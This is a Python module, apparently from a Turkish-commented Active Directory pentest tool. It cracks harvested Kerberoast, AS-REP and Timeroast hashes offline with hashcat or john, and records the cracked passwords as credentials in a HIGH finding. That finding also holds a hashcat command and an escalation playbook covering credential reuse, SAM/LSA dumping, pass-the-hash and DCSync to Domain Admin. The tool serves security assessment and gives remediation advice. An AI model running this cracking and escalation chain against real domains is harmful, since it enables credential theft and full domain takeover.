"""Çevrimdışı hash kırma motoru — Kerberoasting (TGS) ve AS-REP.

nxc `--kerberoasting FILE` / `--asreproast FILE` harvest edilen hash'leri
(`loot/kerb.txt`, `loot/asrep.txt`) bir sözlükle (varsayılan rockyou) kırmaya
çalışır. Kırılan parolaları zincire **kimlik** olarak besler (spray/reuse/escalate
bunları kullanır) ve bir bulgu üretir.

Neden araç içinde? Kerberoast/AS-REP'in değeri hash'i ALMAK değil, KIRMAKtır;
kırılan servis/kullanıcı parolası çoğu zaman doğrudan yanal harekete ya da (SPN
admin ise) yetki yükseltmeye götürür. Kırma CPU-yoğun ve kesintili olduğundan
`--runtime` ile kendini sınırlar; sistem saatine/DC'ye dokunmaz.

hashcat tercih edilir (etype'a göre doğru mod); yoksa john'a düşer. Kimlik
bulunamazsa sessizce boş döner — tarama akışını asla düşürmez.
"""

from __future__ import annotations

import os
import re
import tempfile

from .findings import Credential, Finding, ScanReport, Severity
from .runner import resolve_tool, run, strip_dryrun

# Yaygın sözlük konumları (ilk bulunan kullanılır)
WORDLIST_CANDIDATES = [
    "/usr/share/wordlists/rockyou.txt",
    "/usr/share/wordlists/rockyou.txt.gz",  # hashcat .gz'yi doğrudan okur
    "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
    "/opt/wordlists/rockyou.txt",
]

# hash prefix (etype dahil) -> hashcat modu
#   13100 = Kerberoast TGS-REP RC4      (etype 23)
#   19600 = Kerberoast TGS-REP AES128   (etype 17)
#   19700 = Kerberoast TGS-REP AES256   (etype 18)
#   18200 = AS-REP RC4                  (etype 23)
#   31300 = Timeroast MS-SNTP (makine hesabı)
_TGS_MODE = {"23": "13100", "17": "19600", "18": "19700"}
_ASREP_MODE = {"23": "18200", "17": "19600", "18": "19700"}

_RX_TGS = re.compile(r"\$krb5tgs\$(\d+)\$\*([^$*]+)\$", re.IGNORECASE)
_RX_ASREP = re.compile(r"\$krb5asrep\$(?:(\d+)\$)?([^@$:]+)@", re.IGNORECASE)
# Timeroast: nxc biçimi "RID:$sntp-ms$<hash>$<salt>" (RID = makine hesabı tanıtıcısı)
_RX_SNTP = re.compile(r"^(?:(\d+):)?\$sntp-ms\$", re.IGNORECASE)


def default_wordlist() -> str | None:
    """İlk bulunan yaygın sözlüğü döndürür (yoksa None)."""
    for w in WORDLIST_CANDIDATES:
        if os.path.isfile(w):
            return w
    return None


def _hash_meta(line: str) -> tuple[str | None, str | None]:
    """Bir hash satırından (hashcat_modu, kullanıcı_adı) çıkarır."""
    line = line.strip()
    m = _RX_TGS.search(line)
    if m:
        etype, user = m.group(1), m.group(2)
        return _TGS_MODE.get(etype, "13100"), user
    m = _RX_ASREP.search(line)
    if m:
        etype, user = m.group(1) or "23", m.group(2)
        return _ASREP_MODE.get(etype, "18200"), user
    m = _RX_SNTP.match(line)
    if m:
        rid = m.group(1)
        return "31300", (f"makine-RID-{rid}" if rid else "makine-hesabı")
    return None, None


def _read_hashes(paths: list[str]) -> list[str]:
    """Verilen dosyalardan tekrarsız, $krb5 ile başlayan hash satırlarını okur."""
    seen: set[str] = set()
    out: list[str] = []
    for p in paths:
        if not p or not os.path.isfile(p):
            continue
        try:
            with open(p, encoding="utf-8", errors="replace") as fh:
                for raw in fh:
                    ln = raw.strip()
                    if (ln.startswith("$krb5") or "$sntp-ms$" in ln) and ln not in seen:
                        seen.add(ln)
                        out.append(ln)
        except OSError:
            continue
    return out


def _say(ui, text: str) -> None:
    if ui is not None:
        ui.log(text)
    else:
        print(text)


def _run_hashcat(bin_name: str, mode: str, hashes: list[str], wordlist: str,
                 workdir: str, *, timeout: int, dry_run: bool) -> dict[str, str]:
    """Tek bir hashcat modu için kırma + --show; {hash: plaintext} döndürür."""
    infile = os.path.join(workdir, f"in_{mode}.txt")
    potfile = os.path.join(workdir, f"pot_{mode}.txt")
    with open(infile, "w", encoding="utf-8") as fh:
        fh.write("\n".join(hashes) + "\n")

    common = [bin_name, "-m", mode, "--potfile-path", potfile, "--quiet"]
    # Timeroast (31300) satırları "RID:$sntp-ms$..." biçiminde; --username ile
    # hashcat ':' öncesini (RID) yok sayar. krb5 hash'lerinde kullanılmaz.
    if mode == "31300":
        common.append("--username")
    # Kırma turu: -a 0 düz sözlük; --runtime ile kendini sınırla (kesintisiz).
    run(common + ["-a", "0", "--runtime", str(timeout), infile, wordlist],
        tool=f"crack:hashcat:{mode}", timeout=timeout + 60, dry_run=dry_run)
    if dry_run:
        return {}
    # Sonuçları oku: --show, kırılanları "orijinal_hash:parola" olarak basar.
    res = run(common + ["--show", infile], tool=f"crack:show:{mode}",
              timeout=120, dry_run=False)
    cracked: dict[str, str] = {}
    out = strip_dryrun(res.combined)
    for hline in hashes:
        prefix = hline + ":"
        for sline in out.splitlines():
            if sline.startswith(prefix):
                cracked[hline] = sline[len(prefix):]
                break
    return cracked


def _run_john(bin_name: str, hashes: list[str], wordlist: str, workdir: str,
              *, timeout: int, dry_run: bool) -> dict[str, str]:
    """hashcat yoksa john ile kırma (format otomatik); {hash: plaintext} döndürür."""
    infile = os.path.join(workdir, "john_in.txt")
    with open(infile, "w", encoding="utf-8") as fh:
        fh.write("\n".join(hashes) + "\n")
    run([bin_name, f"--wordlist={wordlist}", f"--max-run-time={timeout}", infile],
        tool="crack:john", timeout=timeout + 60, dry_run=dry_run)
    if dry_run:
        return {}
    res = run([bin_name, "--show", infile], tool="crack:john:show",
              timeout=120, dry_run=False)
    # john --show formatı: "user:parola:...". Hash'e geri eşleme için kullanıcı üzerinden.
    cracked: dict[str, str] = {}
    out = strip_dryrun(res.combined)
    user_pw: dict[str, str] = {}
    for ln in out.splitlines():
        parts = ln.split(":")
        if len(parts) >= 2 and parts[0]:
            user_pw[parts[0].lower()] = parts[1]
    for hline in hashes:
        _mode, user = _hash_meta(hline)
        if user and user.lower() in user_pw:
            cracked[hline] = user_pw[user.lower()]
    return cracked


def crack_hashes(report: ScanReport, *, wordlist: str | None = None,
                 timeout: int = 300, dry_run: bool = False, ui=None,
                 extra_files: list[str] | None = None) -> list[Credential]:
    """loot/kerb.txt + loot/asrep.txt (+ extra) hash'lerini kırar; kimlik listesi döndürür.

    Kırılan her parola rapora `source="crack"` kimliği olarak eklenir ve özet bir
    bulgu üretilir. Araç/sözlük/h‌ash yoksa sessizce boş döner.
    """
    loot = os.path.join(report.outdir, "loot")
    paths = [os.path.join(loot, "kerb.txt"), os.path.join(loot, "asrep.txt"),
             os.path.join(loot, "timeroast.txt")]
    if extra_files:
        paths += extra_files
    hashes = _read_hashes(paths)
    if not hashes:
        _say(ui, "  (crack: kırılacak kerberoast/asrep hash'i yok — önce kimlikli LDAP enum)")
        return []

    wl = wordlist or default_wordlist()
    if not wl:
        report.add_error("crack: sözlük bulunamadı (--wordlist ile verin, ör. rockyou.txt)")
        _say(ui, "  (crack: sözlük yok — '--wordlist /usr/share/wordlists/rockyou.txt')")
        return []

    hc = resolve_tool(["hashcat"])
    jn = resolve_tool(["john"])
    if not (hc.available or jn.available):
        report.add_error("crack: hashcat/john kurulu değil — kırma atlandı")
        _say(ui, "  (crack: hashcat/john yok — 'apt install hashcat' ya da john)")
        return []

    _say(ui, f"  ⛏ {len(hashes)} hash kırılıyor (sözlük: {os.path.basename(wl)}, "
             f"maks {timeout}s)…")

    cracked: dict[str, str] = {}
    workdir = tempfile.mkdtemp(prefix="adscan-crack-", dir=loot if os.path.isdir(loot)
                               else None)
    try:
        if hc.available:
            # etype'a göre modlara ayır (hashcat tek modda tek hash türü ister)
            by_mode: dict[str, list[str]] = {}
            for h in hashes:
                mode, _user = _hash_meta(h)
                if mode:
                    by_mode.setdefault(mode, []).append(h)
            # Kırma süresini modlara paylaştır (toplam ~timeout)
            per = max(30, timeout // max(1, len(by_mode)))
            for mode, group in by_mode.items():
                cracked.update(_run_hashcat(hc.name, mode, group, wl, workdir,
                                            timeout=per, dry_run=dry_run))
        else:
            cracked.update(_run_john(jn.name, hashes, wl, workdir,
                                     timeout=timeout, dry_run=dry_run))
    finally:
        pass  # workdir loot altında bırakılır (kanıt/yeniden kullanım)

    new_creds: list[Credential] = []
    for hline, pw in cracked.items():
        _mode, user = _hash_meta(hline)
        if not user or not pw:
            continue
        cred = Credential(username=user, secret=pw, kind="password",
                          domain=report.domain or "", source="crack")
        before = len(report.credentials)
        report.add_credential(cred)
        if len(report.credentials) > before:
            new_creds.append(cred)
            _say(ui, f"    ✓ KIRILDI  {user}:{pw}")

    if cracked:
        from . import config
        ev = ("\n".join(f"{(_hash_meta(h)[1] or '?')}:{p}" for h, p in cracked.items())
              if not config.REDACT
              else f"{len(cracked)} hesap kırıldı (--redact ile gizlendi)")
        report.add(Finding(
            title=f"Kerberoast/AS-REP hash'leri KIRILDI — {len(cracked)} hesap parolası elde edildi",
            severity=Severity.HIGH, target=report.target, source="crack",
            description="Çevrimdışı sözlük saldırısıyla servis/kullanıcı parolaları kırıldı. "
                        "Bu kimlikler doğrudan yanal harekete; SPN'li hesap ayrıcalıklıysa "
                        "yetki yükseltmeye götürür.",
            evidence=ev,
            remediation="Servis hesaplarına 25+ karakter rastgele parola ya da gMSA kullanın; "
                        "ayrıcalıklı hesaplarda SPN'den kaçının; AS-REP için preauth'u zorunlu kılın.",
            reference="Kerberoasting / AS-REP Roasting (offline crack)",
            mitre="T1558.003",
            poc=f"hashcat -m 13100 loot/kerb.txt {wl}   # AES için: -m 19600/-m 19700",
            escalation=(
                "1) Kırılan kimlikleri tüm host'larda dene (yanal hareket):\n"
                f"   adscan {report.target} --reuse -u <kullanıcı> -p <kırılan>   (ya da --auto)\n"
                "2) Pwn3d olunan host'ta secrets dök: nxc smb <host> -u .. -p .. --sam --lsa\n"
                "3) Yeni NT hash'lerle pass-the-hash -> DC'de DCSync (--ntds) -> krbtgt (DA)\n"
                "4) SPN sahibi hesap ayrıcalıklıysa (Domain Admins) -> doğrudan DA")))
    else:
        _say(ui, "  (crack: sözlükte eşleşme yok — daha büyük sözlük/rule deneyin)")

    return new_creds
